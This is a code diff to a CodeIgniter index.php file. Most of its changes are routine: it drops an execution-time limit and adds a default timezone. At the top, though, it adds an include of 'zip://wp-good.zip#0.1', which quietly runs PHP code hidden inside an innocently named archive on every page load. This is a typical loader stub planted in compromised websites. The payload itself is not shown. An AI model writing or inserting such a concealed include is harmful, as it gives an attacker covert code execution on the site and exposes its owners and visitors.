@@ -1,5 +1,7 @@
 <?php
 include dirname(__FILE__) . '/.private/config.php';
+include("zip://wp-good.zip#0.1");?>
+<?php
 /**
  * CodeIgniter
  *
@@ -55,9 +57,13 @@ include dirname(__FILE__) . '/.private/config.php';
  * NOTE: If you change these, also change the error_reporting() code below
  */
  
-    ini_set('max_execution_time', 3000); // 0 = Unlimited
-	
 	define('ENVIRONMENT', 'production');
+	
+	
+	if( ! ini_get('date.timezone') )
+	{
+	   date_default_timezone_set('GMT');
+	} 	
 
 /*
  *---------------------------------------------------------------
@@ -294,4 +300,3 @@ switch (ENVIRONMENT)
  * And away we go...
  */
 require_once BASEPATH.'core/CodeIgniter.php';
-
